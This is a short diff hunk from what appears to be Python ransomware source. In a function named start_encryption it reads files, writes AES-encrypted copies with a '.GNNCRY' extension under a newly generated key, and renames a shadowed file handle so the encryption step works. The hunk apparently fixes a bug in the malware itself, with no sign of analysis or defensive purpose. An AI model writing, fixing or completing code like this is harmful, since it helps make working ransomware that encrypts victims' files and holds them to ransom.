@@ -52,7 +52,7 @@ def start_encryption(files):
             found_file = base64.b64decode(found_file)
             with open(found_file, 'rb') as f:
                 new_file_name = found_file.decode('utf-8') + ".GNNCRY"
-                with open(new_file_name, 'wb') as f:
+                with open(new_file_name, 'wb') as ef:
                     key = generate_keys.generate_key(128, True)
                     AES_obj = symmetric.AESCipher(key)
 
